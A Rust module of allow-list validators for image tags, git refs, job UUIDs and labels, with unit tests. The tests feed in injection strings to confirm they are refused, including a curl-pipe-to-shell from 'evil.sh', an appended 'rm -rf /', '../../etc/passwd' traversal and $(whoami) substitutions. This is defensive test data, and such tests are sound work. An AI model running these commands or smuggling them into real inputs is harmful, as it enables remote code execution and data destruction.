//! What a request may put into a path, an argv, a shell echo or a URL: each check is a hand-written scan of the anchored,
//! `m`-less JavaScript pattern it ports, so a trailing newline is refused. Every set is ASCII, so byte counts are Node's lengths.

fn is_word(b: u8) -> bool {
    b.is_ascii_alphanumeric()
}

/// Docker's own tag grammar (`^[a-zA-Z0-9_][a-zA-Z0-9._-]{0,127}$`): what is rejected here `docker pull` rejects too.
pub fn is_valid_image_tag(tag: &str) -> bool {
    match tag.as_bytes() {
        [first, rest @ ..] => (is_word(*first) || *first == b'_') && rest.len() <= 127 && rest.iter().all(|b| is_word(*b) || matches!(b, b'.' | b'_' | b'-')),
        [] => false,
    }
}

pub fn is_valid_recreate_mode(value: &str) -> bool {
    value == "all"
}

/// Lands in a raw.githubusercontent URL and a single-quoted shell echo, so it is an allow-list, not an escape.
pub fn is_valid_provision_ref(reference: &str) -> bool {
    let bytes = reference.as_bytes();
    if bytes.is_empty() || bytes.len() > 255 || reference.contains("..") {
        return false;
    }
    if reference.starts_with('/') || reference.ends_with('/') || reference.contains("//") {
        return false;
    }
    is_word(bytes[0]) && bytes.iter().all(|b| is_word(*b) || matches!(b, b'.' | b'_' | b'/' | b'-'))
}

/// `^[A-Za-z0-9 ._:/-]{1,80}$`
pub fn is_valid_requester_label(label: &str) -> bool {
    (1..=80).contains(&label.len()) && label.bytes().all(|b| is_word(b) || matches!(b, b' ' | b'.' | b'_' | b':' | b'/' | b'-'))
}

/// A request-echoed exec-script job id reaches a path and an argv, so only a UUID passes, in either case.
pub fn is_valid_job_id(id: &str) -> bool {
    id.len() == 36
        && id.bytes().enumerate().all(|(at, b)| if matches!(at, 8 | 13 | 18 | 23) { b == b'-' } else { b.is_ascii_hexdigit() })
}

/// An opencode-log run id, `^[A-Za-z0-9-]{1,100}$`. `api` is one, so `/opencode-log/api` is the dashboard.
pub fn is_valid_run_id(id: &str) -> bool {
    (1..=100).contains(&id.len()) && id.bytes().all(|b| is_word(b) || b == b'-')
}

#[cfg(test)]
mod tests {
    use super::*;

    const UUID: &str = "12345678-1234-4234-8234-123456789012";

    fn all_of(check: fn(&str) -> bool, texts: &[&str], want: bool) {
        for text in texts {
            assert_eq!(check(text), want, "{text:?}");
        }
    }

    #[test]
    fn given_a_job_id_shaped_like_a_real_random_uuid_when_validated_then_it_is_accepted() {
        let real = "5b0d7a52-6f0c-4a39-b3a3-0f6f1d7c9e21";
        all_of(is_valid_job_id, &[real, &real.to_uppercase(), UUID, "ABCDEF01-2345-4678-89AB-CDEF01234567", "abcdef01-2345-4678-89ab-cdef01234567"], true);
    }

    #[test]
    fn given_a_value_that_is_not_a_bare_uuid_when_validated_then_it_is_rejected() {
        let candidates = [
            "../../etc/passwd",
            "",
            "not-a-uuid",
            "12345678-1234-1234-1234-123456789012; rm -rf /",
            &format!("{UUID}/../other-job"),
            &format!("{UUID} "),
            &format!(" {UUID}"),
            &format!("{UUID}\n"),
            "12345678-1234-1234-1234-12345678901",
            "12345678-1234-1234-1234-1234567890123",
            "12345678_1234-1234-1234-123456789012",
            "1234567g-1234-1234-1234-123456789012",
            "12345678123412341234123456789012",
            "1234567\u{17f}-1234-1234-1234-123456789012",
            "\u{ff11}2345678-1234-1234-1234-123456789012",
        ];
        all_of(is_valid_job_id, &candidates, false);
    }

    #[test]
    fn given_refs_a_real_deploy_uses_when_validated_then_they_are_accepted_up_to_255_characters() {
        let longest = "a".repeat(255);
        let refs = [
            "main",
            "claude/oracle-cloud-agent-provisioning-scaffold",
            "v1.2.3",
            "a",
            "47210700850be715eb63d37055270549b316c46f",
            "a.b",
            "a/b",
            "feature/x",
            "a/./b",
            &longest,
        ];
        all_of(is_valid_provision_ref, &refs, true);
    }

    #[test]
    fn given_shell_breakouts_traversal_or_bad_slashes_when_validated_as_a_ref_then_they_are_rejected() {
        let too_long = "a".repeat(256);
        let refs = [
            "main'; curl evil.sh | sh; echo '",
            "main\"; whoami; \"",
            "main$(whoami)",
            "main`whoami`",
            "main;id",
            "main|id",
            "main\nid",
            "main\n",
            "main id",
            "main&id",
            "main>out",
            "a%27b",
            "\u{e9}",
            "../../etc/passwd",
            "main/../../x",
            "..",
            "a..b",
            "/main",
            "main/",
            "a//b",
            "-main",
            ".main",
            "_main",
            "",
            &too_long,
        ];
        all_of(is_valid_provision_ref, &refs, false);
    }

    #[test]
    fn given_docker_tags_when_validated_then_they_match_the_tag_grammar() {
        let longest = "a".repeat(128);
        all_of(is_valid_image_tag, &["latest", "sha-89abcde", "a", "_x", "a.b-c_d", "A9", &longest], true);
        let too_long = "a".repeat(129);
        let bad = ["-x", ".x", "a:b", "", "x y", "x\n", "sha-1234567\n", "\u{e9}", "a/b", &too_long];
        all_of(is_valid_image_tag, &bad, false);
    }

    #[test]
    fn given_recreate_values_when_validated_then_only_all_in_lower_case_is_a_mode() {
        all_of(is_valid_recreate_mode, &["all"], true);
        all_of(is_valid_recreate_mode, &["ALL", "", "x", " all", "all "], false);
    }

    #[test]
    fn given_requester_labels_when_validated_then_the_ascii_set_up_to_80_characters_passes() {
        let longest = "a".repeat(80);
        all_of(is_valid_requester_label, &["wf ship", "unknown", " ", "wf:ship/x-y_z.1", &longest], true);
        let too_long = "a".repeat(81);
        all_of(is_valid_requester_label, &["", "a\nb", "a\n", "\u{e9}", "a;b", "a%20b", &too_long], false);
    }

    #[test]
    fn given_run_ids_when_validated_then_letters_digits_and_dashes_up_to_100_characters_pass() {
        let longest = "a".repeat(100);
        all_of(is_valid_run_id, &["a", "abc-DEF-123", "api", "-", "--x", &longest], true);
        let too_long = "a".repeat(101);
        all_of(is_valid_run_id, &["", "a_b", "a b", "a\n", "\u{e9}", "a.b", &too_long], false);
    }
}
